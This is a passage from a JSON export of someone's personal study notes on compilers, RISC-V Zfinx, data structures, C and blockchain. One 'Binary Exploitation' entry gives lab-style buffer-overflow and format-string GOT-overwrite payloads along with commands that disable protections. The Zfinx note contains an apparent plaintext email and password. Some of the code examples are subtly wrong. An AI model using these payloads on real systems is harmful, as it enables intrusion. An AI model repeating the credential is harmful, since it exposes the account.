add_imm r3, r3, 1\n        eq      r2, r3\n        jc      .LBB0_3\n        j       .LBB0_2\n.LBB0_3:                                # %for.cond.cleanup\n        ret\n.Lfunc_end0:\n        .size   memset, .Lfunc_end0-memset\n                                        # -- End function\n        .ident  \"clang version 11.0.0\n(https://tiger.git.embecosm.com/tiger/llvm-project.git\n5f5620c0f445066875824efbd24e2c0ad44831a4)\"\n        .section        \".note.GNU-stack\",\"\",@progbits\n        .addrsig\n```\n\nThe idea is to check the code generated from the compiler for memset and memcpy to figure out what goes on internally to then move on to prototyping the generation of a hardware loop in the compiler itself.\n\n`memset.S` written by Ed for NXP:\n\n```\n.file    \"memset.S\"\n    .text\n    .globl    memset\n    .align    2\n    .type    memset,@function\nmemset:\n    mov.w   r6,     r4      ; copy dest\n.L1:\n    cmp.w   r1,     #0      ; num == 0\n    beq     .L2\n    mov.b   @r4+,   r0l\n    sub.w   r1,     #1      ; num--\n    bra     .L1\n.L2:\n    mov.w   r0,     r6      ; return dest\n    ret\n```",
    "lastmodified": "2022-11-24T12:20:55.638869882Z",
    "tags": null
  },
  "/notes/daily/zfinx-notes": {
    "title": "ZFinx Notes",
    "content": "# ZFinx Notes\n---\nHi I'm Pietra, I've been looking at your problem with my colleagues Mary and Jessica. I'm wondering if there were any changes to the problem since we last spoke? Did the video help? \n\nChange disassembly to print out a floating point number instead\nBecause the disassembly will print %d not %f, meaning you'd have to make a whole new one\n\ntc-riscv.c\nriscv-dis.c\ninclude/opcode/riscv.h\n\nMaybe we didnt fully understand, could you please give us a day to have a look\n\nTo my understanding, Zfinx (Z F-in-X) changes all existing floating point extensions that use floating point registers to use integer registers instead. Also removes all the floating point encodings, so it only uses the integer encodings.\n\nSo it loads integer data and then it has the FP arithmetic for Zfinx, so for example ADD would be of F encoding.o\n\nVendor specific -\u003e instead of unknown it will be COREV\n\nFrom what I found out, it is very similar to the softfloat routines \n\nUpdate documentation for COREV\n\nYou have 32 Int regs and 32 FP regs, they are very expensive\nSo cant we repurpose the int register and when you do FP operations, its held physically in an integer register.\n\nit takes an integer class register not a floating point class register \n\nupstream binutils -\u003e maybe try to implement one of his intructions\n\ninfo@embecosm.com\n6xEvk42bUgrxFVg\n\nIt depends if the operand is encoded, it will find out what bits are set for that operand. They need to match the encoding.\n\nZfinx how to switch the opcodes to make it do choose?\n\nto add a new target gcc/common/config/riscv/riscv-common.c:650",
    "lastmodified": "2022-11-24T12:20:55.648990989Z",
    "tags": null
  },
  "/notes/general/2-3-trees": {
    "title": "2-3 Trees",
    "content": "# 2-3 Trees\n---\nA tree, where every internal node has either:\n- two children and one data element (2-node); or\n- three children and two data elements (3-node).\n\nLeaf nodes have no children and one or two data elements.\n\n**2-3 trees are required to be balanced**.\n\n![2-3-tree](notes/images/2-3-tree.png)\n",
    "lastmodified": "2022-11-24T12:20:55.670898438Z",
    "tags": null
  },
  "/notes/general/admonition-cheatsheet": {
    "title": "Admonition Cheatsheet",
    "content": "# Admonition Cheatsheet\n---\n```\nad-\u003ctype\u003e # Admonition type. \ntitle: # Admonition title.\ncollapse: # Create a collapsible admonition.\nicon: # Override the icon.\ncolor: # Override the color.\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla.\n```\n\n## Code Block\n```ad-bug\ntitle: I'm a bug!\n~~~javascript\nthrow new Error(\"Oops, I'm a bug.\");\n~~~\n```\n\n## Nested\n````ad-info\n\n```ad-bug\ntitle: I'm Nested!\n~~~javascript\nthrow new Error(\"Oops, I'm a bug.\");\n~~~\n```\n\n```javascript\nconsole.log(\"Hello!\");\n```\n\n````\n\n## Admonition Types\n\nThe following admonition types are currently supported:\n\n| Type     | Aliases                     |\n| -------- | --------------------------- |\n| note     | note, seealso               |\n| abstract | abstract, summary, tldr     |\n| info     | info, todo                  |\n| tip      | tip, hint, important        |\n| success  | success, check, done        |\n| question | question, help, faq         |\n| warning  | warning, caution, attention |\n| failure  | failure, fail, missing      |\n| danger   | danger, error               |\n| bug      | bug                         |\n| example  | example                     |\n| quote    | quote, cite                 |\n\n---\nMore info [here](https://squidfunk.github.io/mkdocs-material/reference/admonitions/) and [here is the repo](https://github.com/valentine195/obsidian-admonition).",
    "lastmodified": "2022-11-24T12:20:55.688425183Z",
    "tags": null
  },
  "/notes/general/alan-turing": {
    "title": "alan-turing",
    "content": "# Alan Turing\n- Alan Mathison Turing\n- 23rd of June 1912 to 7th of June 1954.\n- Mathematician.\n- Pardoned in 2013.\n- Created the concept of a [turing machine](notes/general/turing-machines.md).",
    "lastmodified": "2022-11-24T12:20:56.001073599Z",
    "tags": null
  },
  "/notes/general/algorithms-and-data-structure": {
    "title": "Algorithms and Data Structure",
    "content": "# Algorithms and Data Structure\n---\n## Topics\n- [Sets and Maps](notes/general/sets-and-maps.md)\n- [Vectors and Arrays](notes/general/vectors-arrays.md)\n- [Big O Notation](notes/general/big-o-notation.md)\n- [Lists](notes/general/lists.md)\n- [Stacks and Queues](notes/general/stack.md)\n- [Hash Tables](notes/general/hash-tables.md)\n- [Trees](notes/general/trees.md)\n- [Sorting](notes/general/sorting.md)\n- [Graphs](notes/general/graphs.md)\n    - [Minimum Spanning Subtree](notes/general/minimum-spanning-tree.md)\n    - [Dijkstra](notes/general/dijkstra-algorithm.md)\n    - [Floyd-Warshall](notes/general/floyd-warshall.md)\n    - [Inkblot](notes/general/inkblot-algorithm.md)\n- [Garbage Collection](notes/general/garbage-collection.md)\n- [Problems](notes/general/cs-problems.md)\n\n### Extra Resources\n- [Visualisation](https://visualgo.net/en)\n- [Youtube Course in Java 1](https://www.youtube.com/playlist?list=PLpPXw4zFa0uKKhaSz87IowJnOTzh9tiBk)\n- [Youtube Course in Java 2](https://www.youtube.com/watch?v=RBSGKlAvoiM)\n- [Princeton Course](https://www.youtube.com/watch?v=RBSGKlAvoiM)\n- [Java MOOC by University of Helsinki](https://java-programming.mooc.fi/)\n\n## Mathematical Algorithms\n- [Linear Equations](notes/general/linear-equations.md)\n- [Newton-Raphson Iteration](notes/general/newton-raphson.md)",
    "lastmodified": "2022-11-24T12:20:55.704957843Z",
    "tags": null
  },
  "/notes/general/ambiguous-grammars": {
    "title": "Ambiguous Grammars",
    "content": "# Ambiguous Grammars\n---\n- An ambiguous grammar permits more than one parse [tree](notes/general/trees.md) for some sentences. For example, parsing **xxx** with the following grammar:\n\nS $\\rightarrow$ AA\n\nA $\\rightarrow$ x | xx\n\n- But useful:\n\nexpression $\\rightarrow$ expression binop expression | integer\n\nbinop $\\rightarrow$ + | - | * | /\n\n- Use rules (e.g. BODMAS) to disambiguate, and/or rewrite:\n\nexpression $\\rightarrow$ expression termop term | term\n\ntermop $\\rightarrow$ + | -\n\nterm $\\rightarrow$ term factorop integer | integer\n\nfactorop $\\rightarrow$ * | /\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)\n",
    "lastmodified": "2022-11-24T12:20:56.01544559Z",
    "tags": null
  },
  "/notes/general/b-trees": {
    "title": "B-Trees",
    "content": "# B-Trees\n---\nA B-tree of order **m** has the following properties:\n- every node has at most **m** children.\n- every non-leaf node (except root) has at least **m/2** children.\n- the root has at least 2 children if its not a leaf.\n- a non-leaf node with **k** children contains **k**-1 data elements.\n- all leaves appear in the same level and carry no information.\n\n## Sorted B-Trees\nIf the data elements of a node are $a_1$, $a_2$, ..., $a_n$, then:\n* all elements in the leftmost subtree will be **less than** $a_1$.\n* all elements in the rightmost subtree will be **greater than** $a_n$.\n* all elements in the subtree between $a_{k-1}$ and $a_k$ will be **greater than** $a_{k-1}$ and **less than** $a_k$.\n\n**2-3 trees are B-trees of order 3**.\n\nB-trees are useful where data is in large blocks, hence databases and filesystems.",
    "lastmodified": "2022-11-24T12:20:56.218813777Z",
    "tags": null
  },
  "/notes/general/big-o-notation": {
    "title": "Big O Notation",
    "content": "# Big O Notation\n---\nIt describes how the performance of an algorithm scales with the size of the problem.\n\n[](notes/general/compiler-optimisation.md#Performance%7CPerformance) may be **time to execute** or **amount of memory**.\n\nSize must be a quantitative measure of the scale of the problem. For example:\n- Number of items to sort.\n- Number of nodes in a graph.\n\nAn everyday example would be `n` people shaking hands in a room where the **number of handshakes** is $O(n^2)$ and **time to shake hands** is $O(n)$.\n\n## Performance Families\n![5067FFC5-4A77-4CF9-A02B-8E0619F149B9](notes/images/5067FFC5-4A77-4CF9-A02B-8E0619F149B9.jpeg)\n\n![Screenshot 2022-10-24 at 17.15.36](notes/images/Screenshot%202022-10-24%20at%2017.15.36.png)\n\nClassifications ordered by **decreasing** efficiency:\n- Constant: O(1)\n- Logarithmic: O($log_n$)\n- Sublinear: O($n^d$) for d \u003c 1\n- Linear: O(n)\n- Linearithmic: O($n log_n$)\n- Quadratic: O($n^2$)\n- Exponential: O($2^n$)\n",
    "lastmodified": "2022-11-24T12:20:56.039613366Z",
    "tags": null
  },
  "/notes/general/binary-exploitation": {
    "title": "Binary Exploitation - By HTB",
    "content": "# Binary Exploitation\n---\n## 00\n- Check file vulnerabilities:\n```bash\nchecksec --file \u003cfilename\u003e\n```\n\n- Gets rid of Stack, NX and PIE protection (-m32 changes to 32bits):\n```bash\ngcc \u003cfilename\u003e.c -o \u003cfilename\u003e -fno-stack-protector -z execstack -no-pie -m32\n```\n\n## 01\nGDB-Pwndbg:\n- It breaks exactly where the breakpoint is.\n\nTo view a variable/condition you can use the code below. This would print the location of the result, so it is a pointer to a register that holds it.\n```bash\nx $ebp - 0xc\n```\n\nYou can then change that register like this:\n```bash\nset *0xffffceac = 1\n```\n\n## 02\nIf file type is **LSB** then reverse order, for example _dead_ would be _daed_. To get it:\n\n```bash\npython2 -c 'print 32 * \"A\" + \"\\xef\\xbe\\xad\\xde\"'\n```\n\nSend to a file and run with it: (xD)\n```bash\npython2 -c 'print 32 * \"A\" + \"\\xef\\xbe\\xad\\xde\"' \u003e payload\n./runMeImaFile \u003c payload\n```\n\n## 03\nRadare2:\n```bash\naa\nafl\n```\n\nWe can use `cyclic 100` in `gdb-pwndbg` to generate a pattern, then run that into the program. We then get the characters in the register (eg `eip`) and run `cyclic -l \u003cstring\u003e`, so for example: \n```bash\ncyclic -l haaa\n```\n\nIt will return how many bytes we need to overflow.\n\nIf the function we want to access is in `0x08049182` for example, we can do:\n```bash\npython2 -c 'print \"A\" * 28 + \"\\x82\\x91\\x04\\x08\"' \u003e payload\n```\n\n```bash\nropper --file ret2win_params --search \"pop rsi\"\n```\n\n## 04\nWe check the `cycle`, then figure out how much to overflow. We find the `return` address (what function returns), set a breakpoint to it then run the program with the payload generated.\n\ndeadbeef = `\\xef\\xbe\\xad\\xde`\n\nWhen a function is called, the return pointer is pushed to the stack, so it knows where to return to, followed by any function parameters.\n\nWith 64bits, we have to populate the registers not just send the parameters, for example `rdi` and `rsi`. We also when running `cyclic` take the values from the `RSP`, for example the first four.\n\n## 05\nGetting a shell:\n```bash\nshellcraft -l\nshellcraft i386.linux.sh\n\n# to get it in assembly:\nshellcraft i386.linux.sh -f a\n```\n\nTo get a reverse shell:\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\n# control + z\nstty raw -echo; fg;\nexport TERM=xterm\n```\n\n## 06\nThis file is safer as you can see with `checksec`. Therefore, we need to execute `bin/sh` from LibC.\n\nTo find libC we can run `ldd \u003cfilename\u003e`.\n\nTo turn off randomiser:\n```bash\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n```\n\nTo get libC address:\n```bash\nldd \u003cfilename\u003e\n```\n\nTo find the offset from base libC to system:\n```bash\nreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep system\n```\n\nTo find offset to `/bin/sh` for example:\n```bash\nstrings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep \"/bin/bash\"\n```\n\n## 08\n- https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html\n- https://github.com/shellphish/how2heap\n- https://ir0nstone.gitbook.io/notes/types/stack\n\n- Can use `piebase` in gdb-pwndbg to figure out the offset. For example, `breakrva \u003ca function for example 0x11f0` sets a breakpoint in that function no matter if the program restarts as it knows the offset from the top of the run.\n\nTo find **libc** in a remote server: https://libc.blukat.me/ by using the leaked address, for example puts.\n\nWe can find the `GOT.printf` address in Ghidra, inside `.got.plt`. We can then write something at it.\n\n### Tutorial\n- Need to overwrite 0x0804c00c (`GOT.printf`) with 0xf7dff040 (`LIBC.system`).\n\n- It means writing 0xf7df (63455) @ 0x0804c00c + 2 = 0x0804c00e (high order) and 0xf040 (61504) @ 0x0804c00c (low order).\n\n- Now, we have to figure out the value to set for the padding. Here is the formula :\n\n```\n[The value we want] - [The bytes alredy wrote] = [The value to set].            \n```                                                                                  \n\n- Let’s start with the low order bytes :                                        \n\nIt’ll will be 61504 - 8 = 61496, because we already wrote 8 bytes (the two 4 bytes addresses).\n\n- Then, the high order bytes:                                                  \n\nIt’ll will be 63455 - 61504 = 1951, because we already wrote 61504 bytes (the two 4 bytes addresses and 61496 bytes from the previous writing).                                                     \n\n- Now we can construct the exploit (note our write offset is `%4` so we want `[%4,%5]` as offsets instead of `[%7,%8]`):\n\n```\n      \\x0c\\xc0\\x04\\x08 or 0x0804c00c (in reverse order) points to the low order bytes.    \n      \\x0e\\xc0\\x04\\x08 or 0x0804c00e (in reverse order) points to the high order bytes.\n      %61496x will write 61496 bytes on the standard output.                                              \n      %4$hn will write 8 + 61496 = 61504 bytes (or 0xf040) at the first address specified (0x0804c00c).\n      %1951x will write 1951 bytes on the standard output.                                                  \n      %5$hn will write 8 + 61496 + 1951 = 63455 (or 0xf7df) at the second address specified (0x0804c00e).\n```                                                                                            \n\n```python\n  python2 -c 'print(\"\\x0c\\xc0\\x04\\x08\\x0e\\xc0\\x04\\x08%61496x%4$hn%1951x%5$hn\")' \u003e payload\n```                                                                                      \n\n  * Based on excellent blogpost: https://axcheron.github.io/exploit-101-format-strings/\n\n```bash\n(cat payload; cat) | ./got_overwrite\n```\n\n## HTB - Explosion (Starting Point)\n- Info on ports [here](https://www.speedguide.net/ports.php).\n\n## HTB - Preignition (Starting Point)\n- Dir busting:\n```bash\nsudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {ip}\n```\n\n## HTB - Bike (Starting Point)\nHacktricks guide ([here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection))\n\n### Useful tools\n- Ghidra\n- GDB\n- Radare2\n- Ropper\n- GDB-PwnDBG\n- LTrace",
    "lastmodified": "2022-11-24T12:20:56.207834363Z",
    "tags": null
  },
  "/notes/general/binary-heap": {
    "title": "Binary Heap",
    "content": "# Binary Heap\n---\nA binary heap is a form of [binary tree](notes/general/binary-trees.md), with two additional properties:\n\n- It is a **complete** binary tree, meaning that all levels of the tree (except possibly the last one) are full.\n    - If not complete, the last level is filled from left to right.\n\n- The data stored in each node is greater than or equal to the data in the node's **children**.\n    - With the variant which is less than or equal.\n\n![binary-heap](notes/images/binary-heap.png)\n\n## Binary Heap Representation\nUse an array with **N** elements.\n\n- Root at index 0.\n- Children of node at index **i** at $2i+1$ and $2i + 2$\n- Parent of node at index **i** at $floor((i-1)/2)$.\n\n![binary-heap-representation](notes/images/binary-heap-representation.png)\n\n## Reference\n- [Heapsort](notes/general/heapsort.md)\n",
    "lastmodified": "2022-11-24T12:20:56.36269033Z",
    "tags": null
  },
  "/notes/general/binary-trees": {
    "title": "Binary Trees",
    "content": "# Binary Trees\n---\nA binary tree is a set of _nodes_ linked into a simple structure. Every node has at most two children.\n\n- Each node has **data**, a **left pointer** and a **right pointer**.\n- Each **pointer** can point to one other node (or be NULL).\n\n![binary-tree](notes/images/binary-tree.png)\n\n## Nomenclature\n- A node is the **parent** of any node to which it pointer.\n- A node is the **child** of any node that points to it.\n- A node can be a **child** and a **parent**.\n- A node is the **root** of the tree if it has **no parent**.\n- A node is a **leaf** is it has **no children**.\n\n![binary-tree-example](notes/images/binary-tree-example.png)\n\n## Searching\n```bash\n23 57 62 123 159 194 215 274 287 384\n```\n![binary-tree-search](notes/images/binary-tree-search.png)\n\n### In code\n```c\nstruct node {\n  node *left;\n  node *right;\n  int data;\n};\n\nnode *\ntreesearch (node *n, int *k) {\n  if (NULL = n) {\n    return NULL;\n  }\n  else if (k == n.data) {\n    return n;\n  }\n  else if (k \u003c n.data) {\n    return treesearch (node-\u003eleft, k)\n  }\n  else {\n    return treesearch (node-\u003eright, k)\n  }\n}\n```\n\n## Tree Traversal\nDepth first (**inorder** or infix):\n- left subtree.\n- root.\n- right subtree.\n\n Depth first (**preorder** or prefix):\n - root.\n - left subtree.\n - right subtree.\n\nDepth first (**postorder** or postfix):\n- left subtree.\n- right subtree.\n- root.\n\nBreath first:\n- all roots at each level in turn.\n- to do efficiently needs the right representation.\n\n### Direction of Traversal\nAll traversals can be right to left instead.\n\n- R-\u003eL inorder is the inverse of L-\u003eR inorder.\n- R-\u003eL preorder is the inverse of L-\u003eR postorder.\n- R-\u003eL postorder is the inverse of L-\u003eR preorder.\n\n![binary-tree-expr](notes/images/binary-tree-expr.png)\n",
    "lastmodified": "2022-11-24T12:20:56.392482281Z",
    "tags": null
  },
  "/notes/general/blockchain": {
    "title": "Blockchain",
    "content": "# Blockchain\n---\n- Video [source](https://www.youtube.com/watch?v=gyMwXuJrbJQ).\n- More https://github.com/smartcontractkit/full-blockchain-solidity-course-js#welcome-to-the-course.\n\n## What is a Blockchain?\nIt is a distributed database or ledger that is shared among the nodes of a computer network. It stores information electronically in digital format. \n\nThey are best known for their role in cryptocurrency system, such as Bitcoin, for maintaining a secure and decentralised record of transactions.\n\nThe main difference between a typical database and a blockchain is how the data is structured. A **blockchain** collects information together in groups, known as **blocks**, that hold sets of information. They have certain storage capacities and, when filled, are closed and linked to the previous filled block, forming a **chain** of data known as the blockchain. A database usually structures its data into tables.\n\n## What is a Smart Contract?\nThey are computer programs that are hosted and executed on a blockchain network.\n\nEach smart contract consists of code specifying **predetermined** conditions that, when met, trigger outcomes. By running on a decentralised blockchain instead of a centralised server, smart contracts allow multiple parties to come to a shared result in an accurate, timely and **tamper-proof** manner.\n\nThey are a powerful infrastructure for automation because they are not controlled by a central administrator and are not vulnerable to single points of attack by malicious entities.\n\nOne smart contract can have multiple different conditions and one application can have multiple different smart contracts to support an interconnected set of processes. \n\nAn example of a contract language for programming is Ethereum's [Solidity](https://docs.soliditylang.org/en/v0.8.7/).\n\nAny developer can create a smart contract and deploy it on a public blockchain for their own purposes, e.g., a personal yield aggregator that automatically shifts their funds to the highest-earning application. However, many smart contracts involve multiple independent parties that may or may not know one another and don’t necessarily trust one another. \n\nThe smart contract defines exactly how users can interact with it, involving who can interact with the smart contract, at what times, and what inputs result in what outputs.  The result is multi-party digital agreements that evolve from today’s probabilistic state, where they will **probably** execute as desired, to a new deterministic state where they are **guaranteed** to execute according to their code.\n\n## What is an Oracle?\nA [blockchain oracle](https://blog.chain.link/oracles-the-key-to-unlocking-smart-contracts/) is any device or entity that connects a deterministic blockchain with off-chain data.\n\n![Screenshot 2022-07-01 at 09-53-33 What Is a Blockchain Oracle](notes/images/Screenshot%202022-07-01%20at%2009-53-33%20What%20Is%20a%20Blockchain%20Oracle.png)\n\nIf there is an API in the middle, the nodes could be interfered.\n\nIn blockchain, the mechanism for agreeing upon a data value is called [consensus](https://blockgeeks.com/guides/blockchain-consensus/), and determinism is important so that nodes can come to a consensus.\n\nOracles enter every data input through an external transaction. This way, we can be sure that the blockchain itself contains all of the information required to verify itself. This is why oracles are known as blockchain middleware: They are the bridge between the two worlds.\n\n![Screenshot 2022-07-01 at 09-55-17 What Is a Blockchain Oracle](notes/images/Screenshot%202022-07-01%20at%2009-55-17%20What%20Is%20a%20Blockchain%20Oracle.png)\n\n[The oracle problem](https://ethereum.stackexchange.com/a/84645/57451) is these two pieces combined:\n\n1.  Blockchains alone can’t access outside data.\n2.  Using centralised oracles nullifies the advantage of smart contracts — and are major security risks\n\n[Chainlink](https://chain.link/) solves both of these and is the standard for decentralised oracles.\n\n### What is a decentralised oracle?\nA [decentralised oracle](https://docs.chain.link/docs/architecture-decentralised-model) or decentralised oracle network is a group of independent blockchain oracles that provide data to a blockchain. Every independent node or oracle in the decentralised oracle network independently retrieves data from an off-chain source and brings it on-chain. The data is then aggregated so the system can come to a deterministic value of truth for that data point. Decentralised oracles solve the oracle problem.\n\nChainlink is a framework for choosing your independent network of nodes to connect the real world’s data to the blockchain to enable smart contracts to reach their true potential. With this, we are leveraging the same reliable decentralised infrastructure concept the blockchain has, but for blockchain oracles. If nodes/sources are hacked, depreciated, or deleted, the network of Chainlink will leverage the decentralised network and carry on.\n\n![decentralised Oracles are the solution to the Oracle Problem.](https://miro.medium.com/max/700/1*86phwklV3lpLzdz6Ob1gdg.png)\n\nThere are massive marketplaces leveraging the Chainlink technology to help you pick your network of independent nodes to pull your data from. This way, your smart contracts can easily never have a single point of failure.\n\nThe technology is blockchain agnostic and is constantly working to integrate with more blockchains so all blockchains can have access to reliable secure off-chain data. And best of all, the [documentation](https://docs.chain.link/docs) is great for beginner engineers and experienced alike.\n\nUsing one blockchain oracle is a huge risk and chainlink offers a fantastic new ecosystem around data. Blockchain oracles are the key to unlocking the future that smart contracts have for us. Oracles also provide a way for blockchains to see into each other. This is known as [interoperability](https://cointelegraph.com/explained/blockchain-interoperability-explained), and is an important next step as well.\n\n## Web3\nAn idea for a new World Wide Web which incorporates concepts such as decentralisation, using blockchain technologies for example.",
    "lastmodified": "2022-11-24T12:20:56.606623292Z",
    "tags": null
  },
  "/notes/general/bubble-sort": {
    "title": "Bubble Sort",
    "content": "# Bubble Sort\n---\nBubble sort is $O(n_2)$ meaning it is:\n- efficient if **n** is small.\n- efficient if the array is mostly sorted.\n\nIt is a **stable** sort.\n\nIt repeatedly compares adjacent parts of elements then swap the elements in part putting the smaller first. When it reaches the end of the list, it starts over. It stops when no more swaps can be made.\n\nThere are $n-1$ comparisons in the best case, with $O(n)$.\n\nThe worst case would be when the data is in reverse order.\n\n![500](notes/images/Screenshot%202022-10-24%20at%2017.00.36.png)\n\n## Implementation\n```c\n#define N 5\n\nvoid swap (int *a, int *b) {\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\n\nint main () {\n  int a[N];\n  int j, k;\n\n  for (k=1; k\u003cN; k++) {\n  for (j=k; (j\u003e0) \u0026\u0026 (a[j] \u003c a[j-1]); j--)\n    swap (\u0026(a[j]), \u0026(a[j-1]));\n  }\n}\n```\n\nOutput:\n```bash\n$ ./bubble5\n96 96 20 94 9\n96 20 96 94 9\n20 96 96 94 9\n20 96 94 96 9\n20 94 96 96 9\n20 94 96 9 96\n20 94 9 96 96\n20 9 94 96 96\n9 20 94 96 96\n```\n\n## Code Example\n```c\n/* Basic bubble sort\n\n   Copyright (C) 2020 Embecosm Limited \u003cwww.embecosm.com\u003e\n   Contributor: Jeremy Bennett \u003cjeremy.bennett@embecosm.com\u003e\n   SPDX-License-Identifier: GPL-3.0-or-later */\n\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n\n#ifndef N\n#define N 5\n#endif\n\nvoid\npopulate (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    arr[i] = rand () % 100;\n}\n\nvoid\nswap (int *a, int *b)\n{\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\n\nvoid\ndump_array (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    printf (\"%d \", arr[i]);\n\n  printf (\"\\n\");\n}\n\nint\nmain ()\n{\n  int a[N];\n  int j, k;\n\n  srand (561U);\n\n  populate (a);\n  dump_array (a);\n\n  for (k = 1; k \u003c N; k++)\n    for (j = k; (j \u003e 0) \u0026\u0026 (a[j] \u003c a[j - 1]); j--)\n      {\n\tswap (\u0026(a[j]), \u0026(a[j - 1]));\n\tdump_array (a);\n      }\n\n  return 0;\n}\n\n/*\nLocal Variables:\nmode: C\nc-file-style: \"gnu\"\nEnd:\n*/\n```",
    "lastmodified": "2022-11-24T12:20:56.613108635Z",
    "tags": null
  },
  "/notes/general/bucket-sort": {
    "title": "Bucket Sort",
    "content": "# Bucket Sort\n---\nGenerally you can't do better than $O_{n\\ log\\ n}$ with **binary comparison**.\n\nHowever, can do better if the structure of the data is known, which allows to sort it into **buckets** in a single operation.\n\nFor example:\n- Integers (buckets on digits), a.k.a. [_radix_ sort](https://en.wikipedia.org/wiki/Radix_sort).\n- Words (buckets on letters).\n\nThe [](notes/general/compiler-optimisation.md#Performance%7Cperformance) for bucket for on a given number of digit is $O_{_(n)}$ but also $O_(d)$ in the number of digits.\n\nIt is [](notes/general/sorting.md#Stability%7Cstable).\n\n## Example\n```bash\n```\n\nStart by sorting on the least significant digit:\n| Bins | Sublist       |\n| ---- | ------------- |\n| 0    |               |\n| 1    |               |\n| 2    | 472  432      |\n| 3    |               |\n| 4    | 254  534  654 |\n| 5    |               |\n| 6    |               |\n| 7    | 477           |\n| 8    |               |\n| 9    | 459  649  239 | \n\nThen we go to the second digit, preserving ordering from first sort:\n| Bins | Sublist       |\n| ---- | ------------- |\n| 0    |               |\n| 1    |               |\n| 2    |               |\n| 3    | 432  534  239 |\n| 4    | 649           |\n| 5    | 654  254  459 |\n| 6    |               |\n| 7    | 472  477      | \n| 8    |               |\n| 9    |               |\n\nAnd then finally on the third digit, again preserving ordering:\n| Bins | Sublist            |\n| ---- | ------------------ |\n| 0    |                    |\n| 1    |                    |\n| 2    | 239  254           |\n| 3    |                    |\n| 4    | 432  459  472  477 |\n| 5    | 534                |\n| 6    | 649  654           |\n| 7    | 472  477           |\n| 8    |                    |\n| 9    |                    |",
    "lastmodified": "2022-11-24T12:20:56.6489259Z",
    "tags": null
  },
  "/notes/general/c-language": {
    "title": "C",
    "content": "# C\n## Declaration vs Definition\nA **definition** associates a name with an implementation of that name, either data or code:\n\n - A definition of a **variable** induces the compiler to reserve some space for that variable and possibly fill that space with a particular value.\n- A definition of a **function** induces the compiler to generate code for that function.\n\nA **declaration** tells the compiler that a definition of something exists elsewhere in the program, probably in a different C file. A definition is also a declaration, but it also happens to fill in the particular \"elsewhere\".\n\nFor **variables**, the definition is split into two sorts:\n\n- **global**: exist for the whole lifetime of the program (\"static extent\"), and are usually accessible in lots of different functions.\n- **local**: only exist while a particular function is being executed (\"local extent\") and are only accessible within that function.\n\nCouple special cases:\n\n- **static local variables** are actually global variables, because they exist for the lifetime of the program, even though they are only visible inside a single function.\n- **static global variables** are the same, even though they can only be accessed by the functions in the particular file where they were defined.\n\nMaking a function **static** just narrows down the number of places that are able to refer to that function by name.\n\nWe can use **malloc** or **new** to store information in memory that is dynamically allocated. Because we can't refer to the space allocated by name, we use pointers instead. The memory can be reallocated with **free** or **delete**.\n\n```c\n/* This is the definition of a uninitialized global variable */\nint x_global_uninit;\n\n/* This is the definition of a initialized global variable */\nint x_global_init = 1;\n\n/* This is the definition of a uninitialized global variable, albeit\n * one that can only be accessed by name in this C file */\nstatic int y_global_uninit;\n\n/* This is the definition of a initialized global variable, albeit\n * one that can only be accessed by name in this C file */\nstatic int y_global_init = 2;\n\n/* This is a declaration of a global variable that exists somewhere\n * else in the program */\nextern int z_global;\n\n/* This is a declaration of a function that exists somewhere else in\n * the program (you can add \"extern\" beforehand if you like, but it's\n * not needed) */\nint fn_a(int x, int y);\n\n/* This is a definition of a function, but because it is marked as\n * static, it can only be referred to by name in this C file alone */\nstatic int fn_b(int x)\n{\n  return x+1;\n}\n\n/* This is a definition of a function. */\n/* The function parameter counts as a local variable */\nint fn_c(int x_local)\n{\n  /* This is the definition of an uninitialized local variable */\n  int y_local_uninit;\n  /* This is the definition of an initialized local variable */\n  int y_local_init = 3;\n\n  /* Code that refers to local and global variables and other\n   * functions by name */\n  x_global_uninit = fn_a(x_local, x_global_init);\n  y_local_uninit = fn_a(x_local, y_local_init);\n  y_local_uninit += fn_b(z_global);\n  return (y_global_uninit + y_local_uninit);\n}\n```\n## Dissecting an Object File\nWe can use `nm` to look at the file above:\n\n```bash\nSymbols from c_parts.o:\n\nName                  Value   Class        Type         Size     Line  Section\n\nfn_a                |        |   U  |            NOTYPE|        |     |*UND*\nz_global            |        |   U  |            NOTYPE|        |     |*UND*\nfn_b                |00000000|   t  |              FUNC|00000009|     |.text\nx_global_init       |00000000|   D  |            OBJECT|00000004|     |.data\ny_global_uninit     |00000000|   b  |            OBJECT|00000004|     |.bss\nx_global_uninit     |00000004|   C  |            OBJECT|00000004|     |*COM*\ny_global_init       |00000004|   d  |            OBJECT|00000004|     |.data\nfn_c                |00000009|   T  |              FUNC|00000055|     |.text\n```\n\n- **U**: undefined reference.\n- **t** or **T**: indicates where code is defined, indicating whether the function is local to this file (**t**) or not (**T**) (`.text`).\n- **d** or **D**: initialised global variable, **d** meaning local and **D** global (`.data`).\n- **b** is for static/local **uninitialised** global variables, and **B** and **C** if it is not static/local (`.bss`).",
    "lastmodified": "2022-11-24T12:20:56.765666008Z",
    "tags": null
  },
  "/notes/general/chomsky-grammars": {
    "title": "Chomsky Grammars",
